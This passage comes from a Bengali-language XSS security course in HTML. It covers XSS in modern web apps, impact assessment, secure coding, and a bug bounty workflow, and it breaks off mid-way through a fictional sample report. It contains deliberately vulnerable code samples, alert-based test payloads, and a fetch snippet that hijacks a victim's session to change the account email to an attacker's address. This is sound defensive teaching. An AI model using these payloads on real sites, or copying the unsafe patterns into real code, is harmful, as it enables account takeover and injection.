+  <p>Admin panel প্রায়ই সবচেয়ে কম পরীক্ষিত অংশ, কারণ developer ধরে নেন "শুধু বিশ্বস্ত admin-রা এটি দেখেন"। কিন্তু admin dashboard প্রায়ই সাধারণ ইউজারদের জমা দেওয়া ডেটা (সাপোর্ট টিকিট, রিপোর্ট করা কনটেন্ট, ইউজার তালিকা) প্রদর্শন করে — এটিই blind XSS (অধ্যায় ৩)-এর সবচেয়ে সাধারণ টার্গেট, এবং impact-ও সবচেয়ে বেশি কারণ admin-এর privilege সবচেয়ে উঁচু।</p>
+
+  <h2>Client-Side Routing</h2>
+  <p>SPA router-এ route parameter (যেমন <code>/user/:id</code>) থেকে ডেটা নিয়ে সরাসরি পেজ টাইটেল বা breadcrumb-এ বসানো একটি সাধারণ DOM-based XSS উৎস, বিশেষ করে যখন framework-এর auto-escaping এড়িয়ে ম্যানুয়ালি DOM manipulate করা হয়।</p>
+
+  <h2>Third-Party Widgets</h2>
+  <p>Chat widget, analytics script, advertisement iframe-এর মতো third-party ইন্টিগ্রেশন নিজেরাই XSS-এর উৎস হতে পারে, অথবা তাদের configuration (যেমন একটি widget-কে পাঠানো ইউজারনেম) যদি sanitize না করা ডেটা বহন করে। এছাড়া, <code>postMessage</code>-ভিত্তিক communication-এ যদি origin যাচাই না করা হয়, একটি দূষিত iframe/উইন্ডো থেকে বার্তা গ্রহণ করে তা কোনো sink-এ বসানো একটি আধুনিক DOM-based XSS প্যাটার্ন।</p>
+  <div class="codeblock"><div class="cb-head"><span>Vulnerable postMessage handler</span><button class="copy-btn">কপি</button></div><pre><code>// ❌ কোনো origin check নেই
+window.addEventListener('message', function(e) {
+  document.getElementById('widget').innerHTML = e.data.html;
+});
+
+// ✅ সঠিক: origin যাচাই + safe rendering
+window.addEventListener('message', function(e) {
+  if (e.origin !== 'https://trusted-widget.example') return;
+  document.getElementById('widget').textContent = e.data.text;
+});</code></pre></div>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি SPA-তে ইউজার প্রোফাইল পেজে bio তিনটি ভিন্ন জায়গায় দেখানো হয় — প্রোফাইল পেজ (React, auto-escaped), পুশ নোটিফিকেশন প্রিভিউ (Vanilla JS, <code>innerHTML</code> ব্যবহার করে), এবং admin-এর ইউজার-লিস্ট (server-side rendered, raw)। কোন কোন জায়গা ঝুঁকিপূর্ণ হতে পারে এবং কেন একটি জায়গায় ফিক্স যথেষ্ট না?</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>আধুনিক আর্কিটেকচারে (SPA, REST API, messaging, markdown, admin panel, third-party widget) XSS ভিন্ন ভিন্ন রূপে লুকিয়ে থাকে। একই ডেটা একাধিক জায়গায় ভিন্ন কোড দিয়ে রেন্ডার হলে, প্রতিটি জায়গা আলাদাভাবে যাচাই করা জরুরি — একটি জায়গার ফিক্স অন্য জায়গার জন্য যথেষ্ট না।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>কেন "JSON নিরাপদ কারণ এটি HTML না" — এই ধারণা ভুল?</li>
+      <li>SVG ফাইল আপলোড কীভাবে XSS vector হয়ে উঠতে পারে?</li>
+      <li><code>postMessage</code> হ্যান্ডলারে origin check না থাকলে কী ঝুঁকি তৈরি হয়?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter08"><span>পূর্ববর্তী</span>অধ্যায় ০৮</a>
+    <a class="next" href="/chapter10"><span>পরবর্তী</span>অধ্যায় ১০ — প্রভাব ও ঝুঁকি মূল্যায়ন</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 10 — XSS Impact and Risk Assessment
+========================================================= -->
+<section class="chapter" id="chapter10">
+  <div class="eyebrow">অধ্যায় ১০ · মূল্যায়ন</div>
+  <h1>XSS Impact and Risk Assessment</h1>
+  <p class="sub">একটি XSS finding-এর প্রকৃত severity কীভাবে নির্ধারণ করবেন — শুধু "execute হয়েছে" বলার বাইরে গিয়ে প্রমাণ-ভিত্তিক মূল্যায়ন।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> Impact যাচাইয়ের সময়ও সবসময় harmless proof-of-execution (<code>alert</code>) ব্যবহার করুন — বাস্তব ডেটা এক্সফিল্ট্রেশন/অ্যাকাউন্ট পরিবর্তনের মাধ্যমে impact "প্রমাণ" করার প্রয়োজন নেই এবং তা destructive।</p></div>
+
+  <h2>Confidentiality, Integrity ও Availability (CIA)</h2>
+  <div class="grid3">
+    <div class="card"><h4>Confidentiality</h4><p>সেশন কুকি, ব্যক্তিগত ডেটা, API টোকেন চুরি হওয়ার সম্ভাবনা।</p></div>
+    <div class="card"><h4>Integrity</h4><p>ভিকটিমের সেশন ব্যবহার করে ডেটা/সেটিংস পরিবর্তন (যেমন ইমেইল পরিবর্তন, পোস্ট করা)।</p></div>
+    <div class="card"><h4>Availability</h4><p>সাধারণত কম প্রাসঙ্গিক, তবে defacement বা ক্রমাগত ক্ষতিকর redirect সার্ভিস ব্যবহারযোগ্যতা ব্যাহত করতে পারে।</p></div>
+  </div>
+
+  <h2>User Privilege ও Affected Users</h2>
+  <p>একটি XSS-এর severity সরাসরি নির্ভর করে — <strong>কাকে</strong> আক্রমণ করা সম্ভব তার উপর। একটি reflected XSS যা শুধুমাত্র নিজের অ্যাকাউন্টে কাজ করে (self-XSS) তা সাধারণত কম গুরুত্বপূর্ণ, কারণ ভিকটিমকে নিজেই নিজের বিরুদ্ধে payload চালাতে রাজি করাতে হবে — যা বাস্তবসম্মত attack scenario হিসেবে দুর্বল। অন্যদিকে, একটি stored XSS যা admin panel-এ দেখা যায়, সর্বোচ্চ severity পায়, কারণ এটি যেকোনো সাধারণ ইউজার থেকে admin privilege পর্যন্ত escalate করতে পারে।</p>
+
+  <h2>Stored XSS-এর ঝুঁকি কেন বেশি</h2>
+  <p>Stored XSS-এর impact reflected-এর চেয়ে বেশি কারণ: (১) কোনো social engineering/বিশেষ লিঙ্কে ক্লিক করানোর প্রয়োজন নেই — ভিকটিম স্বাভাবিকভাবে পেজ ভিজিট করলেই আক্রান্ত হয়, (২) একাধিক ভিকটিমকে একসাথে প্রভাবিত করতে পারে, এবং (৩) persist করে — একবার fix না হওয়া পর্যন্ত বারবার trigger হতে থাকে।</p>
+
+  <h2>Session Security ও HttpOnly Cookies</h2>
+  <p>যদি session cookie <code>HttpOnly</code> flag দিয়ে সেট করা থাকে, JavaScript (<code>document.cookie</code>) দিয়ে সেই cookie পড়া সম্ভব হয় না — এটি XSS-এর মাধ্যমে সরাসরি session token চুরির ঝুঁকি উল্লেখযোগ্যভাবে কমায়। তবে এটি XSS-কে সম্পূর্ণ নিরাপদ করে না — attacker তখনও ভিকটিমের ব্রাউজারের মধ্যে থেকে সরাসরি authenticated API কল করতে পারে (cookie পড়তে না পারলেও, ব্রাউজার automatically সেই cookie attach করবে একই origin-এর request-এ)।</p>
+  <div class="codeblock"><div class="cb-head"><span>HttpOnly থাকা সত্ত্বেও সম্ভাব্য impact</span><button class="copy-btn">কপি</button></div><pre><code>// Session cookie চুরি করা সম্ভব না, কিন্তু ভিকটিমের সেশন ব্যবহার করে
+// সরাসরি action চালানো এখনও সম্ভব:
+fetch('/api/change-email', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include', // ব্রাউজার স্বয়ংক্রিয়ভাবে cookie পাঠাবে
+  body: JSON.stringify({email: 'attacker@evil.example'})
+});</code></pre></div>
+
+  <h2>CSP-এর সীমাবদ্ধতা Impact মূল্যায়নে</h2>
+  <p>একটি সক্রিয় CSP থাকলে সেটি XSS-এর কার্যকারিতা সীমিত করতে পারে, কিন্তু severity assessment-এ CSP-কে পুরোপুরি "mitigated" হিসেবে ধরে নেওয়া উচিত না — কারণ CSP bypass প্রায়ই সম্ভব হয় (অধ্যায় ৮), এবং অনেক CSP policy-তে ফাঁক থাকে। Severity নির্ধারণের সময় CSP-এর উপস্থিতি নোট করা উচিত, কিন্তু vulnerability-কে সম্পূর্ণভাবে non-issue বলে বাতিল করা উচিত না, যদি না bypass অসম্ভব বলে যাচাই করা হয়।</p>
+
+  <h2>Severity Assessment — একটি কাঠামো</h2>
+  <table>
+    <thead><tr><th>ফ্যাক্টর</th><th>উচ্চ severity নির্দেশ করে</th><th>নিম্ন severity নির্দেশ করে</th></tr></thead>
+    <tbody>
+      <tr><td>XSS-এর ধরন</td><td>Stored, বিশেষ করে admin-visible</td><td>Reflected, self-XSS</td></tr>
+      <tr><td>Interaction প্রয়োজন</td><td>কোনো ক্লিক/ইন্টারঅ্যাকশন ছাড়াই (autofocus/onload)</td><td>ভিকটিমের একাধিক নির্দিষ্ট পদক্ষেপ প্রয়োজন</td></tr>
+      <tr><td>Session security</td><td>HttpOnly নেই, cookie সরাসরি চুরি সম্ভব</td><td>HttpOnly আছে, state-changing action সীমিত</td></tr>
+      <tr><td>CSP উপস্থিতি</td><td>নেই, বা bypass-যোগ্য</td><td>কঠোরভাবে কনফিগার করা, bypass পাওয়া যায়নি</td></tr>
+      <tr><td>Affected scope</td><td>সব ইউজার/admin</td><td>শুধু আক্রমণকারী নিজের অ্যাকাউন্ট</td></tr>
+    </tbody>
+  </table>
+
+  <h2>CVSS-এর প্রাসঙ্গিকতা</h2>
+  <p><strong>CVSS (Common Vulnerability Scoring System)</strong> XSS-এর জন্যও ব্যবহৃত হয়, বিশেষ করে attack vector (Network), attack complexity, privileges required, user interaction প্রয়োজন কি না, এবং scope (vulnerability কি শুধু ভিকটিমের ডেটা প্রভাবিত করে নাকি অন্য security scope-এও ছড়ায়) বিবেচনা করে। একটি unauthenticated stored XSS যা admin-কে প্রভাবিত করে, সাধারণত High-Critical রেঞ্জে পড়ে; একটি self-XSS সাধারণত খুবই কম স্কোর পায় বা bug-bounty প্রোগ্রাম সেটিকে "Not Applicable/Informative" হিসেবে গণ্য করে। প্রকৃত স্কোরের জন্য official CVSS calculator ব্যবহার করা উচিত।</p>
+
+  <h2>Evidence-Based Impact Analysis</h2>
+  <p>একটি দায়িত্বশীল impact assessment সবসময় প্রকৃত প্রমাণের উপর ভিত্তি করে হওয়া উচিত, অনুমানের উপর না:</p>
+  <ul>
+    <li>❌ "এটি দিয়ে সম্পূর্ণ অ্যাকাউন্ট টেকওভার সম্ভব" (কোনো প্রমাণ ছাড়া অনুমান)</li>
+    <li>✅ "নিজের lab অ্যাকাউন্টে, <code>HttpOnly</code> সেট না থাকায় <code>document.cookie</code> দিয়ে session token সফলভাবে পড়া গেছে (স্ক্রিনশট সংযুক্ত); CSP অনুপস্থিত থাকায় কোনো বাধা পাওয়া যায়নি"</li>
+  </ul>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি reflected XSS পাওয়া গেছে একটি ফিচারে যা শুধুমাত্র ইউজার নিজে লগইন করার পরেই দেখা যায়, এবং payload trigger করতে ভিকটিমকে নিজেই একটি বিশেষ URL-এ গিয়ে, নিজের অ্যাকাউন্টেই payload জমা দিতে হবে। এটি কি একটি গুরুত্বপূর্ণ ফাইন্ডিং? আপনার যুক্তি দিন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>XSS impact assessment নির্ভর করে affected user-এর privilege, প্রয়োজনীয় interaction, session security (HttpOnly) এবং CSP-এর উপস্থিতির উপর। Severity নির্ধারণ সবসময় evidence-based হতে হবে, অনুমান-ভিত্তিক দাবি নয়। Self-XSS সাধারণত কম গুরুত্বপূর্ণ, যেখানে admin-visible stored XSS সর্বোচ্চ গুরুত্বের।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li><code>HttpOnly</code> cookie থাকা সত্ত্বেও কেন একটি XSS এখনও বিপজ্জনক হতে পারে?</li>
+      <li>Self-XSS কেন সাধারণত কম severity পায়?</li>
+      <li>CSP উপস্থিত থাকলে severity মূল্যায়নে কী বিবেচনা করা উচিত?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter09"><span>পূর্ববর্তী</span>অধ্যায় ০৯</a>
+    <a class="next" href="/chapter11"><span>পরবর্তী</span>অধ্যায় ১১ — প্রতিরোধ ও সিকিউর কোডিং</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 11 — XSS Prevention and Secure Coding
+========================================================= -->
+<section class="chapter" id="chapter11">
+  <div class="eyebrow">অধ্যায় ১১ · প্রতিরোধ</div>
+  <h1>XSS Prevention and Secure Coding</h1>
+  <p class="sub">Vulnerable কোড বনাম fixed কোড — প্রতিটি context-এর জন্য নির্দিষ্ট, প্রয়োগযোগ্য সমাধান।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> এই অধ্যায়ের remediation কৌশল শুধুমাত্র নিজের বা অনুমোদিত অ্যাপ্লিকেশনে প্রয়োগ করুন। নিজের সিকিউর কোডিং অনুশীলনে নির্দ্বিধায় ব্যবহার করুন — এটি প্রতিরক্ষামূলক (defensive) নির্দেশনা।</p></div>
+
+  <h2>Context-Aware Output Encoding — মূল নীতি</h2>
+  <p>XSS প্রতিরোধের একক সবচেয়ে গুরুত্বপূর্ণ নীতি: <strong>ডেটা যে মুহূর্তে আউটপুট হচ্ছে, ঠিক সেই context অনুযায়ী এনকোড করুন — ইনপুট নেওয়ার সময় না।</strong> একই ডেটা বিভিন্ন জায়গায় ভিন্নভাবে ব্যবহৃত হতে পারে, তাই এনকোডিং output-time-এ, context-নির্দিষ্টভাবে করা উচিত।</p>
+
+  <h2><code>textContent</code> ও Safe DOM API</h2>
+  <div class="grid2">
+    <div class="card"><h4>❌ Unsafe</h4><div class="codeblock"><pre><code>el.innerHTML = userInput;
+el.outerHTML = userInput;
+document.write(userInput);</code></pre></div></div>
+    <div class="card"><h4>✅ Safe</h4><div class="codeblock"><pre><code>el.textContent = userInput;
+el.setAttribute('data-x', userInput); // attribute মান হিসেবে নিরাপদ
+const node = document.createTextNode(userInput);
+el.appendChild(node);</code></pre></div></div>
+  </div>
+
+  <h2>HTML Sanitization (যখন Rich HTML সত্যিই প্রয়োজন)</h2>
+  <div class="codeblock"><div class="cb-head"><span>DOMPurify ব্যবহার</span><button class="copy-btn">কপি</button></div><pre><code>import DOMPurify from 'dompurify';
+
+const safeHtml = DOMPurify.sanitize(richTextInput, {
+  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
+  ALLOWED_ATTR: ['href']
+});
+element.innerHTML = safeHtml;</code></pre></div>
+  <p>Allowlist স্পষ্টভাবে সংজ্ঞায়িত করা সবচেয়ে নিরাপদ অভ্যাস — শুধু প্রয়োজনীয় ট্যাগ/attribute অনুমোদন করুন, ডিফল্ট broad allowlist-এর উপর নির্ভর করবেন না যদি আপনার use-case সীমিত হয়।</p>
+
+  <h2>সার্ভার-সাইড উদাহরণ (একাধিক ভাষায়)</h2>
+  <div class="codeblock"><div class="cb-head"><span>PHP — htmlspecialchars()</span><button class="copy-btn">কপি</button></div><pre><code>// ❌ Unsafe
+echo "&lt;p&gt;মন্তব্য: " . $_GET['comment'] . "&lt;/p&gt;";
+
+// ✅ Safe
+echo "&lt;p&gt;মন্তব্য: " . htmlspecialchars($_GET['comment'], ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>Python (Jinja2 — ডিফল্ট auto-escape)</span><button class="copy-btn">কপি</button></div><pre><code>&lt;!-- Jinja2 ডিফল্টভাবে auto-escape করে --&gt;
+&lt;p&gt;মন্তব্য: {{ comment }}&lt;/p&gt;
+
+&lt;!-- ❌ বিপজ্জনক: ম্যানুয়ালি auto-escape বন্ধ করা --&gt;
+&lt;p&gt;মন্তব্য: {{ comment | safe }}&lt;/p&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>Node.js / Express (EJS)</span><button class="copy-btn">কপি</button></div><pre><code>&lt;!-- ✅ Safe: &lt;%= %&gt; auto-escape করে --&gt;
+&lt;p&gt;মন্তব্য: &lt;%= comment %&gt;&lt;/p&gt;
+
+&lt;!-- ❌ Unsafe: &lt;%- %&gt; raw HTML হিসেবে বসায় --&gt;
+&lt;p&gt;মন্তব্য: &lt;%- comment %&gt;&lt;/p&gt;</code></pre></div>
+  <div class="codeblock"><div class="cb-head"><span>Java (OWASP Encoder)</span><button class="copy-btn">কপি</button></div><pre><code>import org.owasp.encoder.Encode;
+
+// ✅ Safe
+out.println("&lt;p&gt;মন্তব্য: " + Encode.forHtml(comment) + "&lt;/p&gt;");</code></pre></div>
+
+  <h2>Content Security Policy প্রয়োগ</h2>
+  <div class="codeblock"><div class="cb-head"><span>একটি শক্তিশালী ডিফল্ট CSP</span><button class="copy-btn">কপি</button></div><pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random-per-request}';
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'self';</code></pre></div>
+  <p>Nonce-ভিত্তিক CSP inline script-কে সম্পূর্ণ নিষিদ্ধ না করে, শুধুমাত্র সার্ভার-জেনারেটেড, প্রতি-request ইউনিক nonce-সহ script চালানোর অনুমতি দেয় — ফলে injected inline script (যার nonce নেই) execute হতে পারে না।</p>
+
+  <h2>Cookie Security</h2>
+  <table>
+    <thead><tr><th>Cookie flag</th><th>প্রভাব</th></tr></thead>
+    <tbody>
+      <tr><td><code>HttpOnly</code></td><td>JavaScript দিয়ে cookie পড়া যাবে না — XSS-এর মাধ্যমে সরাসরি cookie চুরি প্রতিরোধ করে</td></tr>
+      <tr><td><code>Secure</code></td><td>শুধুমাত্র HTTPS কানেকশনে cookie পাঠানো হবে</td></tr>
+      <tr><td><code>SameSite=Strict/Lax</code></td><td>Cross-site request-এ cookie পাঠানো সীমিত করে — CSRF ও কিছু cross-origin আক্রমণ কমায়</td></tr>
+    </tbody>
+  </table>
+
+  <h2>Framework-Specific Defenses — সংক্ষিপ্ত চেকলিস্ট</h2>
+  <ul>
+    <li><strong>React:</strong> <code>dangerouslySetInnerHTML</code> এড়িয়ে চলুন; ব্যবহার করতে হলে সবসময় DOMPurify দিয়ে sanitize করুন।</li>
+    <li><strong>Angular:</strong> <code>bypassSecurityTrustHtml()</code> শুধুমাত্র সত্যিকারের প্রয়োজনে, এবং ইনপুট আগে sanitize করে ব্যবহার করুন।</li>
+    <li><strong>Vue:</strong> <code>v-html</code> এড়িয়ে চলুন; প্রয়োজন হলে sanitize করা কনটেন্টই পাস করুন।</li>
+    <li><strong>যেকোনো templating engine:</strong> ডিফল্ট auto-escaping বন্ধ করা ("raw"/"safe" filter) থেকে বিরত থাকুন, বিশেষ exception হিসেবে ছাড়া।</li>
+  </ul>
+
+  <h2>Vulnerable বনাম Fixed কোড — পূর্ণাঙ্গ উদাহরণ</h2>
+  <div class="codeblock"><div class="cb-head"><span>পূর্ণাঙ্গ before/after (Node.js + Express)</span><button class="copy-btn">কপি</button></div><pre><code>// ❌ BEFORE — vulnerable
+app.get('/greet', (req, res) =&gt; {
+  const name = req.query.name;
+  res.send(`&lt;h1&gt;স্বাগতম, ${name}&lt;/h1&gt;`);
+});
+
+// ✅ AFTER — fixed
+const escapeHtml = require('escape-html');
+app.get('/greet', (req, res) =&gt; {
+  const name = escapeHtml(req.query.name || '');
+  res.send(`&lt;h1&gt;স্বাগতম, ${name}&lt;/h1&gt;`);
+});
+
+// ✅✅ আরও ভালো — templating engine-এর ডিফল্ট auto-escape ব্যবহার করা
+app.get('/greet', (req, res) =&gt; {
+  res.render('greet', { name: req.query.name || '' }); // EJS &lt;%= %&gt; auto-escapes
+});</code></pre></div>
+
+  <h2>Regression Testing</h2>
+  <p>একটি XSS fix স্থায়ীভাবে কার্যকর রাখতে, এটি automated test suite-এর অংশ হওয়া উচিত — যেমন একটি unit/integration test যা নিশ্চিত করে কোনো নির্দিষ্ট endpoint একটি payload স্ট্রিং (<code>&lt;script&gt;</code>) পাঠালে response-এ তা সবসময় encoded অবস্থায় থাকে। এটি ভবিষ্যতে কোনো refactor-এ ভুলবশত fix হারিয়ে যাওয়া প্রতিরোধ করে।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ regression test (ধারণাগত, Jest-সদৃশ)</span><button class="copy-btn">কপি</button></div><pre><code>test('greet endpoint escapes HTML in name parameter', async () =&gt; {
+  const res = await request(app).get('/greet?name=' + encodeURIComponent('&lt;script&gt;alert(1)&lt;/script&gt;'));
+  expect(res.text).not.toContain('&lt;script&gt;');
+  expect(res.text).toContain('&amp;lt;script&amp;gt;');
+});</code></pre></div>
+
+  <h2>Secure Coding চেকলিস্ট</h2>
+  <ul>
+    <li>☑ Output encoding সবসময় context-aware এবং output-time-এ করা হচ্ছে।</li>
+    <li>☑ <code>innerHTML</code>/<code>document.write()</code>/<code>eval()</code> ব্যবহার হলে তার প্রতিটি instance review করা হয়েছে।</li>
+    <li>☑ Rich HTML প্রয়োজন হলে, allowlist-ভিত্তিক sanitizer (DOMPurify) ব্যবহার করা হচ্ছে।</li>
+    <li>☑ Framework-এর escape hatch API-গুলো ন্যূনতম এবং ন্যায্যতাসহ ব্যবহৃত হচ্ছে।</li>
+    <li>☑ CSP প্রয়োগ করা আছে (nonce-based, <code>unsafe-inline</code> ছাড়া)।</li>
+    <li>☑ Session cookie-তে <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> সেট করা আছে।</li>
+    <li>☑ URL/href input-এ স্কিম allowlist প্রয়োগ করা আছে (<code>javascript:</code> নিষিদ্ধ)।</li>
+    <li>☑ XSS fix-এর জন্য automated regression test আছে।</li>
+  </ul>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>নিচের কোডে কী সমস্যা আছে এবং কীভাবে ঠিক করবেন?</p>
+    <div class="codeblock"><pre><code>const link = `&lt;a href="${userProvidedUrl}"&gt;এখানে যান&lt;/a&gt;`;
+container.innerHTML = link;</code></pre></div>
+    <p>ইঙ্গিত: এখানে একাধিক সমস্যা আছে — attribute encoding এবং URL scheme validation, দুটোই বিবেচনা করুন।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>XSS প্রতিরোধের ভিত্তি হলো context-aware output encoding, নিরাপদ DOM API (<code>textContent</code>), প্রয়োজনে allowlist-ভিত্তিক sanitization, এবং defense-in-depth হিসেবে CSP ও secure cookie flags। প্রতিটি framework-এর নিজস্ব escape hatch API সতর্কতার সাথে ব্যবহার করতে হবে, এবং fix-গুলো regression test দিয়ে স্থায়ী করতে হবে।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>কেন output encoding "input নেওয়ার সময়" না করে "output করার সময়" করা উচিত?</li>
+      <li>একটি regression test কীভাবে ভবিষ্যতে XSS fix হারিয়ে যাওয়া প্রতিরোধ করে?</li>
+      <li>URL context-এ শুধু encoding যথেষ্ট না কেন — আর কী প্রয়োজন?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter10"><span>পূর্ববর্তী</span>অধ্যায় ১০</a>
+    <a class="next" href="/chapter12"><span>পরবর্তী</span>অধ্যায় ১২ — বাগ বাউন্টি ওয়ার্কফ্লো</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 12 — Bug Bounty Workflow
+========================================================= -->
+<section class="chapter" id="chapter12">
+  <div class="eyebrow">অধ্যায় ১২ · পেশাদারি</div>
+  <h1>Bug Bounty Workflow</h1>
+  <p class="sub">প্রোগ্রাম নির্বাচন থেকে শুরু করে একটি দায়িত্বশীল, প্রমাণ-ভিত্তিক রিপোর্ট জমা দেওয়া পর্যন্ত সম্পূর্ণ ওয়ার্কফ্লো।</p>
+
+  <div class="callout legal"><div class="ic">⚖️</div><p><strong>আইনি নোটিশ:</strong> শুধুমাত্র স্পষ্টভাবে scope-এ থাকা প্রোগ্রাম/টার্গেটে টেস্টিং করুন, এবং প্রোগ্রামের নিয়মাবলী (rules of engagement) সবসময় মেনে চলুন। Scope-এর বাইরে টেস্টিং, বা নিয়ম ভঙ্গ করা প্রোগ্রাম থেকে ban এবং আইনি ঝুঁকি — উভয়ই তৈরি করতে পারে।</p></div>
+
+  <h2>১. Program Selection</h2>
+  <p>HackerOne, Bugcrowd, Intigriti-এর মতো প্ল্যাটফর্মে প্রোগ্রাম বাছাই করার সময় বিবেচনা করুন: scope কতটা স্পষ্ট ও বিস্তৃত, পূর্ববর্তী response time, XSS-এর জন্য reward range, এবং প্রোগ্রামটি নতুনদের জন্য উপযুক্ত কি না (কিছু প্রোগ্রাম অত্যন্ত প্রতিযোগিতামূলক, already heavily-tested)।</p>
+
+  <h2>২. Scope Verification</h2>
+  <p>প্রোগ্রামের scope ডকুমেন্ট সতর্কতার সাথে পড়ুন — কোন ডোমেইন/সাবডোমেইন অন্তর্ভুক্ত, কোনগুলো explicitly বাদ (out-of-scope), self-XSS গ্রহণযোগ্য কি না, এবং কোন ধরনের testing নিষিদ্ধ (যেমন automated scanner দিয়ে উচ্চ-volume scanning)।</p>
+  <div class="callout warn"><div class="ic">⚠️</div><p>Scope ভুল বোঝা একটি অত্যন্ত সাধারণ ভুল — সন্দেহ হলে প্রোগ্রামের সাথে যোগাযোগ করে নিশ্চিত হয়ে নিন, অনুমান করে এগিয়ে যাবেন না।</p></div>
+
+  <h2>৩. Input-Point Discovery</h2>
+  <p>অধ্যায় ৭-এ শেখা পদ্ধতি অনুসরণ করুন — Burp দিয়ে পুরো অ্যাপ্লিকেশন ক্রল করুন, প্রতিটি input point (URL parameter, form, API endpoint, header) ম্যাপ করুন।</p>
+
+  <h2>৪. Manual Testing ও Hypothesis-Driven Approach</h2>
+  <p>দক্ষ bug hunter-রা random payload না ছুঁড়ে, একটি hypothesis নিয়ে এগোন: "এই ফিচারটি কীভাবে ইমপ্লিমেন্ট করা হয়েছে বলে মনে হচ্ছে, এবং কোথায় developer ভুল করতে পারতেন?" — যেমন একটি "preview" ফিচার, যা raw markdown-কে client-side-এ রেন্ডার করে, প্রায়ই sanitization মিস করার সম্ভাবনা বেশি থাকে।</p>
+
+  <h2>৫. Reproducible Proof of Concept</h2>
+  <p>একটি ভালো PoC-তে থাকা উচিত: সুনির্দিষ্ট ধাপ (step-by-step), ব্যবহৃত exact payload, এবং প্রত্যাশিত ফলাফল — যাতে প্রোগ্রামের ট্রায়াজ টিম কোনো অতিরিক্ত প্রশ্ন ছাড়াই reproduce করতে পারে।</p>
+
+  <h2>৬. Impact Verification</h2>
+  <p>অধ্যায় ১০-এর ফ্রেমওয়ার্ক ব্যবহার করে, প্রমাণ-ভিত্তিকভাবে impact যাচাই করুন — অনুমান নয়, প্রকৃত পর্যবেক্ষণ (যেমন HttpOnly আছে কি না, CSP আছে কি না) রিপোর্টে উল্লেখ করুন।</p>
+
+  <h2>৭. Evidence Collection</h2>
+  <ul>
+    <li>Screenshot/screen recording (harmless <code>alert(document.domain)</code> দেখানো)।</li>
+    <li>HTTP request/response (Burp থেকে exported)।</li>
+    <li>ব্যবহৃত ব্রাউজার ও সংস্করণ।</li>
+    <li>Root cause-এর সংক্ষিপ্ত প্রযুক্তিগত ব্যাখ্যা।</li>
+  </ul>
+
+  <h2>৮. Responsible Disclosure</h2>
+  <p>প্রোগ্রামের নির্ধারিত চ্যানেলের মাধ্যমেই রিপোর্ট জমা দিন। কখনো পাবলিকলি (সোশ্যাল মিডিয়া, ব্লগ) ফাইন্ডিং প্রকাশ করবেন না যতক্ষণ না প্রোগ্রাম স্পষ্টভাবে disclosure-এর অনুমতি দেয় এবং fix deploy হয়ে গেছে।</p>
+
+  <h2>৯. Duplicate ও Informative Findings</h2>
+  <p>অনেক জনপ্রিয় প্রোগ্রামে একই vulnerability একাধিকবার রিপোর্ট হয় — triage team প্রথম রিপোর্টকারীকে reward দেয়, বাকিদের "Duplicate" মার্ক করা হয়। এছাড়া কিছু ফাইন্ডিং (যেমন self-XSS, CSP ছাড়া কম-impact reflected XSS যা প্রোগ্রামের নীতিতে out-of-scope) "Informative"/"Not Applicable" হিসেবে বন্ধ হতে পারে — এটি স্বাভাবিক এবং পেশাদারিভাবে গ্রহণ করা উচিত।</p>
+
+  <h2>১০. Sample Bug Bounty Report (সম্পূর্ণ Fictional উদাহরণ)</h2>
+  <div class="codeblock">
+    <div class="cb-head"><span>Fictional target: "ShopMock" — শুধুমাত্র উদাহরণের জন্য</span><button class="copy-btn">কপি</button></div>
+    <pre><code>শিরোনাম: Stored XSS in Product Review Comment Field (ShopMock)
+
+সারাংশ:
+/product/{id}/reviews এন্ডপয়েন্টে review জমা দেওয়ার সময়,
+"comment" ফিল্ডের মান কোনো output encoding ছাড়াই অন্যান্য ভিজিটরের
+কাছে HTML হিসেবে render হয়, ফলে stored XSS সম্ভব।
+
+ধাপসমূহ (Steps to Reproduce):
+1. https://shopmock.example/product/42 পেজে লগইন অবস্থায় যান।
+2. Review ফর্মে "Comment" ফিল্ডে নিচের payload লিখুন:
+   &lt;script&gt;alert(document.domain)&lt;/script&gt;
+3. "Submit Review" বাটনে ক্লিক করুন।
+4. একটি নতুন ব্রাউজার সেশনে (ইনকগনিটো) একই প্রোডাক্ট পেজ লোড করুন।
+5. পর্যবেক্ষণ করুন: পেজ লোড হওয়ার সাথে সাথে alert('shopmock.example')
+   দেখা যায় — প্রমাণ করে যে payload sanitize না হয়ে execute হচ্ছে।
+
+প্রভাব (Impact):
+- এটি একটি Stored XSS, যা যেকোনো ভিজিটরকে প্রভাবিত করে, কোনো বিশেষ
+  interaction ছাড়াই।
+- সেশন কুকি পরীক্ষা করে দেখা গেছে HttpOnly flag সেট করা নেই, অর্থাৎ
